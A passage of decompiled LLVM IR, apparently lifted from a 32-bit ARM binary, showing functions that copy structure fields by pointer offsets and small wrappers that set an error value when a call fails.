  %v1_1437c = inttoptr i32 %v1_14378 to i32*
  %v2_1437c = load i32, i32* %v1_1437c, align 4
  store i32 %v2_1437c, i32* %r7.global-to-local, align 4
  %v3_1437c = add i32 %v0_14374, 36
  %v4_1437c = inttoptr i32 %v3_1437c to i32*
  %v5_1437c = load i32, i32* %v4_1437c, align 4
  store i32 %v5_1437c, i32* %r8.global-to-local, align 4
  %v1_14380 = inttoptr i32 %v1_14374 to i32*
  %v2_14380 = load i32, i32* %v1_14380, align 4
  %v3_14380 = add i32 %v0_14374, 76
  %v4_14380 = inttoptr i32 %v3_14380 to i32*
  %v5_14380 = load i32, i32* %v4_14380, align 4
  store i32 %v5_14380, i32* %r1.global-to-local, align 4
  %v0_14384 = load i32, i32* %r5.global-to-local, align 4
  %v1_14384 = add i32 %v0_14384, 72
  %v1_14388 = inttoptr i32 %v1_14384 to i32*
  store i32 %v2_14380, i32* %v1_14388, align 4
  %v3_14388 = add i32 %v0_14384, 76
  %v4_14388 = inttoptr i32 %v3_14388 to i32*
  %v5_14388 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14388, i32* %v4_14388, align 4
  %v0_1438c = load i32, i32* %r7.global-to-local, align 4
  %v1_1438c = load i32, i32* %r5.global-to-local, align 4
  %v2_1438c = add i32 %v1_1438c, 32
  %v3_1438c = inttoptr i32 %v2_1438c to i32*
  store i32 %v0_1438c, i32* %v3_1438c, align 4
  %v0_14390 = load i32, i32* %r8.global-to-local, align 4
  %v1_14390 = load i32, i32* %r5.global-to-local, align 4
  %v2_14390 = add i32 %v1_14390, 36
  %v3_14390 = inttoptr i32 %v2_14390 to i32*
  store i32 %v0_14390, i32* %v3_14390, align 4
  %v0_14394 = load i32, i32* %r6.global-to-local, align 4
  %v1_14394 = add i32 %v0_14394, 80
  store i32 %v1_14394, i32* %r3.global-to-local, align 4
  %v1_14398 = add i32 %v0_14394, 48
  store i32 %v1_14398, i32* %r7.global-to-local, align 4
  %v1_1439c = inttoptr i32 %v1_14398 to i32*
  %v2_1439c = load i32, i32* %v1_1439c, align 4
  store i32 %v2_1439c, i32* %r7.global-to-local, align 4
  %v3_1439c = add i32 %v0_14394, 52
  %v4_1439c = inttoptr i32 %v3_1439c to i32*
  %v5_1439c = load i32, i32* %v4_1439c, align 4
  store i32 %v5_1439c, i32* %r8.global-to-local, align 4
  %v1_143a0 = inttoptr i32 %v1_14394 to i32*
  %v2_143a0 = load i32, i32* %v1_143a0, align 4
  %v3_143a0 = add i32 %v0_14394, 84
  %v4_143a0 = inttoptr i32 %v3_143a0 to i32*
  %v5_143a0 = load i32, i32* %v4_143a0, align 4
  store i32 %v5_143a0, i32* %r1.global-to-local, align 4
  %v1_143a4 = add i32 %v0_14394, 16
  %v2_143a4 = inttoptr i32 %v1_143a4 to i32*
  %v3_143a4 = load i32, i32* %v2_143a4, align 4
  store i32 %v3_143a4, i32* %r2.global-to-local, align 4
  %v0_143a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_143a8 = add i32 %v0_143a8, 80
  %v1_143ac = inttoptr i32 %v1_143a8 to i32*
  store i32 %v2_143a0, i32* %v1_143ac, align 4
  %v3_143ac = add i32 %v0_143a8, 84
  %v4_143ac = inttoptr i32 %v3_143ac to i32*
  %v5_143ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_143ac, i32* %v4_143ac, align 4
  %v0_143b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_143b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_143b0 = add i32 %v1_143b0, 48
  %v3_143b0 = inttoptr i32 %v2_143b0 to i32*
  store i32 %v0_143b0, i32* %v3_143b0, align 4
  %v0_143b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_143b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_143b4 = add i32 %v1_143b4, 52
  %v3_143b4 = inttoptr i32 %v2_143b4 to i32*
  store i32 %v0_143b4, i32* %v3_143b4, align 4
  %v0_143b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_143b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_143b8 = add i32 %v1_143b8, 16
  %v3_143b8 = inttoptr i32 %v2_143b8 to i32*
  store i32 %v0_143b8, i32* %v3_143b8, align 4
  %v0_143bc = load i32, i32* %r6.global-to-local, align 4
  %v1_143bc = add i32 %v0_143bc, 88
  store i32 %v1_143bc, i32* %r3.global-to-local, align 4
  %v1_143c0 = add i32 %v0_143bc, 20
  %v2_143c0 = inttoptr i32 %v1_143c0 to i32*
  %v3_143c0 = load i32, i32* %v2_143c0, align 4
  store i32 %v3_143c0, i32* %r2.global-to-local, align 4
  %v1_143c4 = inttoptr i32 %v1_143bc to i32*
  %v2_143c4 = load i32, i32* %v1_143c4, align 4
  %v3_143c4 = add i32 %v0_143bc, 92
  %v4_143c4 = inttoptr i32 %v3_143c4 to i32*
  %v5_143c4 = load i32, i32* %v4_143c4, align 4
  store i32 %v5_143c4, i32* %r1.global-to-local, align 4
  %v1_143c8 = add i32 %v0_143bc, 64
  store i32 %v1_143c8, i32* %r6.global-to-local, align 4
  %v1_143cc = inttoptr i32 %v1_143c8 to i32*
  %v2_143cc = load i32, i32* %v1_143cc, align 4
  store i32 %v2_143cc, i32* %r6.global-to-local, align 4
  %v3_143cc = add i32 %v0_143bc, 68
  %v4_143cc = inttoptr i32 %v3_143cc to i32*
  %v5_143cc = load i32, i32* %v4_143cc, align 4
  store i32 %v5_143cc, i32* %r7.global-to-local, align 4
  %v0_143d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_143d0 = add i32 %v0_143d0, 88
  store i32 %v1_143d0, i32* %r3.global-to-local, align 4
  %v2_143d4 = add i32 %v0_143d0, 20
  %v3_143d4 = inttoptr i32 %v2_143d4 to i32*
  store i32 %v3_143c0, i32* %v3_143d4, align 4
  %v0_143d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_143d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_143d8 = add i32 %v1_143d8, 24
  %v3_143d8 = inttoptr i32 %v2_143d8 to i32*
  store i32 %v0_143d8, i32* %v3_143d8, align 4
  %v0_143dc = load i32, i32* %lr.global-to-local, align 4
  %v1_143dc = load i32, i32* %r5.global-to-local, align 4
  %v2_143dc = add i32 %v1_143dc, 28
  %v3_143dc = inttoptr i32 %v2_143dc to i32*
  store i32 %v0_143dc, i32* %v3_143dc, align 4
  %v0_143e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_143e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_143e0 = add i32 %v1_143e0, 64
  %v3_143e0 = inttoptr i32 %v2_143e0 to i32*
  store i32 %v0_143e0, i32* %v3_143e0, align 4
  %v0_143e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_143e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_143e4 = add i32 %v1_143e4, 68
  %v3_143e4 = inttoptr i32 %v2_143e4 to i32*
  store i32 %v0_143e4, i32* %v3_143e4, align 4
  %v0_143e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_143e8 = inttoptr i32 %v0_143e8 to i32*
  store i32 %v2_143c4, i32* %v1_143e8, align 4
  %v3_143e8 = add i32 %v0_143e8, 4
  %v4_143e8 = inttoptr i32 %v3_143e8 to i32*
  %v5_143e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_143e8, i32* %v4_143e8, align 4
  %v2_143ec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_143ec, i32* %r4.global-to-local, align 4
  ret i32 %v2_143c4

; uselistorder directives
  uselistorder i32 %v0_143bc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14394, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 1, 0, 2 }
  uselistorder i32 104, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_143f4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_143f4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_143f4 = load i32, i32* @r4, align 4
  store i32 %v3_143f4, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1440c = inttoptr i32 %arg2 to i8*
  %v3_1440c = call i32 @function_11790(i8* %v2_1440c, i32 0)
  %v2_14410 = load i32, i32* %arg1, align 4
  %v3_14410 = add i32 %tmp, 4
  %v4_14410 = inttoptr i32 %v3_14410 to i32*
  %v5_14410 = load i32, i32* %v4_14410, align 4
  store i32 %v5_14410, i32* %r4.global-to-local, align 4
  %v0_14414 = load i32, i32* %r6.global-to-local, align 4
  %v1_14414 = inttoptr i32 %v0_14414 to i32*
  store i32 %v2_14410, i32* %v1_14414, align 4
  %v3_14414 = add i32 %v0_14414, 4
  %v4_14414 = inttoptr i32 %v3_14414 to i32*
  %v5_14414 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14414, i32* %v4_14414, align 4
  %v0_14418 = load i32, i32* %r5.global-to-local, align 4
  %v1_14418 = add i32 %v0_14418, 32
  %v1_1441c = inttoptr i32 %v1_14418 to i32*
  %v2_1441c = load i32, i32* %v1_1441c, align 4
  %v3_1441c = add i32 %v0_14418, 36
  %v4_1441c = inttoptr i32 %v3_1441c to i32*
  %v5_1441c = load i32, i32* %v4_1441c, align 4
  store i32 %v5_1441c, i32* %r4.global-to-local, align 4
  %v1_14420 = add i32 %v0_14418, 96
  %v2_14420 = inttoptr i32 %v1_14420 to i32*
  %v3_14420 = load i32, i32* %v2_14420, align 4
  store i32 %v3_14420, i32* %r2.global-to-local, align 4
  %v1_14424 = load i32, i32* %r6.global-to-local, align 4
  %v2_14424 = add i32 %v1_14424, 32
  %v3_14424 = inttoptr i32 %v2_14424 to i32*
  store i32 %v2_1441c, i32* %v3_14424, align 4
  %v0_14428 = load i32, i32* %r4.global-to-local, align 4
  %v1_14428 = load i32, i32* %r6.global-to-local, align 4
  %v2_14428 = add i32 %v1_14428, 36
  %v3_14428 = inttoptr i32 %v2_14428 to i32*
  store i32 %v0_14428, i32* %v3_14428, align 4
  %v0_1442c = load i32, i32* %r2.global-to-local, align 4
  %v1_1442c = load i32, i32* %r6.global-to-local, align 4
  %v2_1442c = add i32 %v1_1442c, 12
  %v3_1442c = inttoptr i32 %v2_1442c to i32*
  store i32 %v0_1442c, i32* %v3_1442c, align 4
  %v0_14430 = load i32, i32* %r5.global-to-local, align 4
  %v1_14430 = add i32 %v0_14430, 48
  %v2_14430 = inttoptr i32 %v1_14430 to i32*
  %v3_14430 = load i32, i32* %v2_14430, align 4
  %v1_14434 = add i32 %v0_14430, 24
  store i32 %v1_14434, i32* %ip.global-to-local, align 4
  %v1_14438 = inttoptr i32 %v1_14434 to i32*
  %v2_14438 = load i32, i32* %v1_14438, align 4
  store i32 %v2_14438, i32* %ip.global-to-local, align 4
  %v3_14438 = add i32 %v0_14430, 28
  %v4_14438 = inttoptr i32 %v3_14438 to i32*
  %v5_14438 = load i32, i32* %v4_14438, align 4
  store i32 %v5_14438, i32* %lr.global-to-local, align 4
  %v1_1443c = load i32, i32* %r6.global-to-local, align 4
  %v2_1443c = add i32 %v1_1443c, 44
  %v3_1443c = inttoptr i32 %v2_1443c to i32*
  store i32 %v3_14430, i32* %v3_1443c, align 4
  %v0_14440 = load i32, i32* %r5.global-to-local, align 4
  %v1_14440 = add i32 %v0_14440, 64
  %v2_14440 = inttoptr i32 %v1_14440 to i32*
  %v3_14440 = load i32, i32* %v2_14440, align 4
  %v1_14444 = add i32 %v0_14440, 56
  %v2_14444 = inttoptr i32 %v1_14444 to i32*
  %v3_14444 = load i32, i32* %v2_14444, align 4
  store i32 %v3_14444, i32* %r2.global-to-local, align 4
  %v1_14448 = load i32, i32* %r6.global-to-local, align 4
  %v2_14448 = add i32 %v1_14448, 52
  %v3_14448 = inttoptr i32 %v2_14448 to i32*
  store i32 %v3_14440, i32* %v3_14448, align 4
  %v0_1444c = load i32, i32* %r2.global-to-local, align 4
  %v1_1444c = load i32, i32* %r6.global-to-local, align 4
  %v2_1444c = add i32 %v1_1444c, 48
  %v3_1444c = inttoptr i32 %v2_1444c to i32*
  store i32 %v0_1444c, i32* %v3_1444c, align 4
  %v0_14450 = load i32, i32* %r5.global-to-local, align 4
  %v1_14450 = add i32 %v0_14450, 72
  %v1_14454 = inttoptr i32 %v1_14450 to i32*
  %v2_14454 = load i32, i32* %v1_14454, align 4
  %v3_14454 = add i32 %v0_14450, 76
  %v4_14454 = inttoptr i32 %v3_14454 to i32*
  %v5_14454 = load i32, i32* %v4_14454, align 4
  store i32 %v5_14454, i32* %r1.global-to-local, align 4
  %v0_14458 = load i32, i32* %r6.global-to-local, align 4
  %v1_14458 = add i32 %v0_14458, 56
  %v1_1445c = inttoptr i32 %v1_14458 to i32*
  store i32 %v2_14454, i32* %v1_1445c, align 4
  %v3_1445c = add i32 %v0_14458, 60
  %v4_1445c = inttoptr i32 %v3_1445c to i32*
  %v5_1445c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1445c, i32* %v4_1445c, align 4
  %v0_14460 = load i32, i32* %r5.global-to-local, align 4
  %v1_14460 = add i32 %v0_14460, 80
  %v1_14464 = inttoptr i32 %v1_14460 to i32*
  %v2_14464 = load i32, i32* %v1_14464, align 4
  %v3_14464 = add i32 %v0_14460, 84
  %v4_14464 = inttoptr i32 %v3_14464 to i32*
  %v5_14464 = load i32, i32* %v4_14464, align 4
  store i32 %v5_14464, i32* %r1.global-to-local, align 4
  %v0_14468 = load i32, i32* %r6.global-to-local, align 4
  %v1_14468 = add i32 %v0_14468, 64
  %v1_1446c = inttoptr i32 %v1_14468 to i32*
  store i32 %v2_14464, i32* %v1_1446c, align 4
  %v3_1446c = add i32 %v0_14468, 68
  %v4_1446c = inttoptr i32 %v3_1446c to i32*
  %v5_1446c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1446c, i32* %v4_1446c, align 4
  %v0_14470 = load i32, i32* %r5.global-to-local, align 4
  %v1_14470 = add i32 %v0_14470, 16
  %v2_14470 = inttoptr i32 %v1_14470 to i32*
  %v3_14470 = load i32, i32* %v2_14470, align 4
  %v1_14474 = load i32, i32* %r6.global-to-local, align 4
  %v2_14474 = add i32 %v1_14474, 16
  %v3_14474 = inttoptr i32 %v2_14474 to i32*
  store i32 %v3_14470, i32* %v3_14474, align 4
  %v0_14478 = load i32, i32* %r5.global-to-local, align 4
  %v1_14478 = add i32 %v0_14478, 88
  %v1_1447c = add i32 %v0_14478, 20
  %v2_1447c = inttoptr i32 %v1_1447c to i32*
  %v3_1447c = load i32, i32* %v2_1447c, align 4
  store i32 %v3_1447c, i32* %r2.global-to-local, align 4
  %v1_14480 = inttoptr i32 %v1_14478 to i32*
  %v2_14480 = load i32, i32* %v1_14480, align 4
  %v3_14480 = add i32 %v0_14478, 92
  %v4_14480 = inttoptr i32 %v3_14480 to i32*
  %v5_14480 = load i32, i32* %v4_14480, align 4
  store i32 %v5_14480, i32* %r1.global-to-local, align 4
  %v0_14484 = load i32, i32* %r6.global-to-local, align 4
  %v1_14484 = add i32 %v0_14484, 72
  %v1_14488 = inttoptr i32 %v1_14484 to i32*
  store i32 %v2_14480, i32* %v1_14488, align 4
  %v3_14488 = add i32 %v0_14484, 76
  %v4_14488 = inttoptr i32 %v3_14488 to i32*
  %v5_14488 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14488, i32* %v4_14488, align 4
  %v0_1448c = load i32, i32* %r2.global-to-local, align 4
  %v1_1448c = load i32, i32* %r6.global-to-local, align 4
  %v2_1448c = add i32 %v1_1448c, 20
  %v3_1448c = inttoptr i32 %v2_1448c to i32*
  store i32 %v0_1448c, i32* %v3_1448c, align 4
  %v0_14490 = load i32, i32* %ip.global-to-local, align 4
  %v1_14490 = load i32, i32* %r6.global-to-local, align 4
  %v2_14490 = add i32 %v1_14490, 24
  %v3_14490 = inttoptr i32 %v2_14490 to i32*
  store i32 %v0_14490, i32* %v3_14490, align 4
  %v0_14494 = load i32, i32* %lr.global-to-local, align 4
  %v1_14494 = load i32, i32* %r6.global-to-local, align 4
  %v2_14494 = add i32 %v1_14494, 28
  %v3_14494 = inttoptr i32 %v2_14494 to i32*
  store i32 %v0_14494, i32* %v3_14494, align 4
  %v2_14498 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14498, i32* %r4.global-to-local, align 4
  ret i32 %v2_14480

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_144a0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_144a0:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_144bc = inttoptr i32 %arg2 to i8*
  %v3_144bc = call i32 @function_11790(i8* %v2_144bc, i32 0)
  %v1_144c0 = add i32 %tmp, 4
  %v2_144c0 = inttoptr i32 %v1_144c0 to i32*
  %v3_144c0 = load i32, i32* %v2_144c0, align 4
  %v2_144c4 = load i32, i32* %arg1, align 4
  store i32 %v2_144c4, i32* %r8.global-to-local, align 4
  %v1_144c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_144c8 = add i32 %v1_144c8, 12
  %v3_144c8 = inttoptr i32 %v2_144c8 to i32*
  store i32 %v3_144c0, i32* %v3_144c8, align 4
  %v0_144cc = load i32, i32* %r4.global-to-local, align 4
  %v1_144cc = add i32 %v0_144cc, 20
  %v2_144cc = inttoptr i32 %v1_144cc to i32*
  %v3_144cc = load i32, i32* %v2_144cc, align 4
  %v1_144d0 = add i32 %v0_144cc, 16
  %v2_144d0 = inttoptr i32 %v1_144d0 to i32*
  %v3_144d0 = load i32, i32* %v2_144d0, align 4
  store i32 %v3_144d0, i32* %r6.global-to-local, align 4
  %v1_144d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_144d4 = add i32 %v1_144d4, 44
  %v3_144d4 = inttoptr i32 %v2_144d4 to i32*
  store i32 %v3_144cc, i32* %v3_144d4, align 4
  %v0_144d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_144d8 = add i32 %v0_144d8, 24
  %v2_144d8 = inttoptr i32 %v1_144d8 to i32*
  %v3_144d8 = load i32, i32* %v2_144d8, align 4
  %v1_144dc = load i32, i32* %r5.global-to-local, align 4
  %v2_144dc = add i32 %v1_144dc, 48
  %v3_144dc = inttoptr i32 %v2_144dc to i32*
  store i32 %v3_144d8, i32* %v3_144dc, align 4
  %v0_144e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_144e0 = add i32 %v0_144e0, 28
  %v2_144e0 = inttoptr i32 %v1_144e0 to i32*
  %v3_144e0 = load i32, i32* %v2_144e0, align 4
  %v1_144e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_144e4 = add i32 %v1_144e4, 52
  %v3_144e4 = inttoptr i32 %v2_144e4 to i32*
  store i32 %v3_144e0, i32* %v3_144e4, align 4
  %v0_144e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_144e8 = add i32 %v0_144e8, 32
  %v1_144ec = inttoptr i32 %v1_144e8 to i32*
  %v2_144ec = load i32, i32* %v1_144ec, align 4
  %v3_144ec = add i32 %v0_144e8, 36
  %v4_144ec = inttoptr i32 %v3_144ec to i32*
  %v5_144ec = load i32, i32* %v4_144ec, align 4
  store i32 %v5_144ec, i32* %r1.global-to-local, align 4
  %v0_144f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_144f0 = add i32 %v0_144f0, 56
  %v1_144f4 = inttoptr i32 %v1_144f0 to i32*
  store i32 %v2_144ec, i32* %v1_144f4, align 4
  %v3_144f4 = add i32 %v0_144f0, 60
  %v4_144f4 = inttoptr i32 %v3_144f4 to i32*
  %v5_144f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_144f4, i32* %v4_144f4, align 4
  %v0_144f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_144f8 = add i32 %v0_144f8, 40
  %v1_144fc = inttoptr i32 %v1_144f8 to i32*
  %v2_144fc = load i32, i32* %v1_144fc, align 4
  %v3_144fc = add i32 %v0_144f8, 44
  %v4_144fc = inttoptr i32 %v3_144fc to i32*
  %v5_144fc = load i32, i32* %v4_144fc, align 4
  store i32 %v5_144fc, i32* %r1.global-to-local, align 4
  %v0_14500 = load i32, i32* %r5.global-to-local, align 4
  %v1_14500 = add i32 %v0_14500, 64
  %v1_14504 = inttoptr i32 %v1_14500 to i32*
  store i32 %v2_144fc, i32* %v1_14504, align 4
  %v3_14504 = add i32 %v0_14500, 68
  %v4_14504 = inttoptr i32 %v3_14504 to i32*
  %v5_14504 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14504, i32* %v4_14504, align 4
  %v0_14508 = load i32, i32* %r4.global-to-local, align 4
  %v1_14508 = add i32 %v0_14508, 48
  %v1_1450c = inttoptr i32 %v1_14508 to i32*
  %v2_1450c = load i32, i32* %v1_1450c, align 4
  %v3_1450c = add i32 %v0_14508, 52
  %v4_1450c = inttoptr i32 %v3_1450c to i32*
  %v5_1450c = load i32, i32* %v4_1450c, align 4
  store i32 %v5_1450c, i32* %r1.global-to-local, align 4
  %v1_14510 = add i32 %v0_14508, 8
  %v2_14510 = inttoptr i32 %v1_14510 to i16*
  %v3_14510 = load i16, i16* %v2_14510, align 2
  %v4_14510 = zext i16 %v3_14510 to i32
  store i32 %v4_14510, i32* %r2.global-to-local, align 4
  %v1_14514 = add i32 %v0_14508, 10
  %v2_14514 = inttoptr i32 %v1_14514 to i16*
  %v3_14514 = load i16, i16* %v2_14514, align 2
  %v4_14514 = zext i16 %v3_14514 to i32
  store i32 %v4_14514, i32* %ip.global-to-local, align 4
  %v1_14518 = add i32 %v0_14508, 12
  %v2_14518 = inttoptr i32 %v1_14518 to i16*
  %v3_14518 = load i16, i16* %v2_14518, align 2
  %v4_14518 = zext i16 %v3_14518 to i32
  store i32 %v4_14518, i32* %lr.global-to-local, align 4
  %v1_1451c = add i32 %v0_14508, 14
  %v2_1451c = inttoptr i32 %v1_1451c to i16*
  %v3_1451c = load i16, i16* %v2_1451c, align 2
  %v4_1451c = zext i16 %v3_1451c to i32
  store i32 %v4_1451c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_14528 = load i32, i32* %r5.global-to-local, align 4
  %v1_14528 = add i32 %v0_14528, 72
  %v1_1452c = inttoptr i32 %v1_14528 to i32*
  store i32 %v2_1450c, i32* %v1_1452c, align 4
  %v3_1452c = add i32 %v0_14528, 76
  %v4_1452c = inttoptr i32 %v3_1452c to i32*
  %v5_1452c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1452c, i32* %v4_1452c, align 4
  %v0_14530 = load i32, i32* %r5.global-to-local, align 4
  %v1_14530 = inttoptr i32 %v0_14530 to i32*
  %v2_14530 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_14530, i32* %v1_14530, align 4
  %v3_14530 = add i32 %v0_14530, 4
  %v4_14530 = inttoptr i32 %v3_14530 to i32*
  %v5_14530 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_14530, i32* %v4_14530, align 4
  %v0_14534 = load i32, i32* %r6.global-to-local, align 4
  %v1_14534 = load i32, i32* %r5.global-to-local, align 4
  %v2_14534 = add i32 %v1_14534, 32
  %v3_14534 = inttoptr i32 %v2_14534 to i32*
  store i32 %v0_14534, i32* %v3_14534, align 4
  %v0_14538 = load i32, i32* %r7.global-to-local, align 4
  %v1_14538 = load i32, i32* %r5.global-to-local, align 4
  %v2_14538 = add i32 %v1_14538, 36
  %v3_14538 = inttoptr i32 %v2_14538 to i32*
  store i32 %v0_14538, i32* %v3_14538, align 4
  %v0_1453c = load i32, i32* %r2.global-to-local, align 4
  %v1_1453c = load i32, i32* %r5.global-to-local, align 4
  %v2_1453c = add i32 %v1_1453c, 16
  %v3_1453c = inttoptr i32 %v2_1453c to i32*
  store i32 %v0_1453c, i32* %v3_1453c, align 4
  %v0_14540 = load i32, i32* %ip.global-to-local, align 4
  %v1_14540 = load i32, i32* %r5.global-to-local, align 4
  %v2_14540 = add i32 %v1_14540, 20
  %v3_14540 = inttoptr i32 %v2_14540 to i32*
  store i32 %v0_14540, i32* %v3_14540, align 4
  %v0_14544 = load i32, i32* %lr.global-to-local, align 4
  %v1_14544 = load i32, i32* %r5.global-to-local, align 4
  %v2_14544 = add i32 %v1_14544, 24
  %v3_14544 = inttoptr i32 %v2_14544 to i32*
  store i32 %v0_14544, i32* %v3_14544, align 4
  %v0_14548 = load i32, i32* %r4.global-to-local, align 4
  %v1_14548 = load i32, i32* %r5.global-to-local, align 4
  %v2_14548 = add i32 %v1_14548, 28
  %v3_14548 = inttoptr i32 %v2_14548 to i32*
  store i32 %v0_14548, i32* %v3_14548, align 4
  ret i32 %v2_1450c

; uselistorder directives
  uselistorder i32 %v0_14508, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 68, { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 60, { 3, 4, 1, 5, 6, 0, 2, 7 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @function_14558() local_unnamed_addr {
dec_label_pc_14558:
  %stack_var_-16 = alloca i32, align 4
  %v2_1455c = ptrtoint i32* %stack_var_-16 to i32
  %v2_14568 = call i32 @function_16298(i32 7, i32 %v2_1455c)
  %v1_1456c = icmp slt i32 %v2_14568, 0
  %v5_14570 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_1456c, i32 256, i32 %v5_14570
  ret i32 %storemerge
}

define i32 @function_14584(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14584:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14584 = load i32, i32* @r7, align 4
  store i32 %v3_14584, i32* %stack_var_-8, align 4
  %v0_14590 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14590, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14590, -4095
  br i1 %tmp, label %dec_label_pc_145b0, label %dec_label_pc_145a0

dec_label_pc_145a0:                               ; preds = %dec_label_pc_14584
  %v0_145a0 = call i32 @function_11734()
  %v0_145a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_145a4 = sub i32 0, %v0_145a4
  %v2_145a8 = inttoptr i32 %v0_145a0 to i32*
  store i32 %v1_145a4, i32* %v2_145a8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_145b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_145b0

dec_label_pc_145b0:                               ; preds = %dec_label_pc_14584, %dec_label_pc_145a0
  %v1_145b4 = phi i32 [ %v0_14590, %dec_label_pc_14584 ], [ -1, %dec_label_pc_145a0 ]
  %v2_145b0 = phi i32 [ %v3_14584, %dec_label_pc_14584 ], [ %v2_145b0.pre, %dec_label_pc_145a0 ]
  store i32 %v2_145b0, i32* @r7, align 4
  ret i32 %v1_145b4

; uselistorder directives
  uselistorder i32 %v0_14590, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_145b0, { 1, 0 }
}

define i32 @function_145b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_145b8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_145b8 = load i32, i32* @r7, align 4
  store i32 %v3_145b8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_145e0, label %dec_label_pc_145d0

dec_label_pc_145d0:                               ; preds = %dec_label_pc_145b8
  %v0_145d0 = call i32 @function_11734()
  %v0_145d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_145d4 = sub i32 0, %v0_145d4
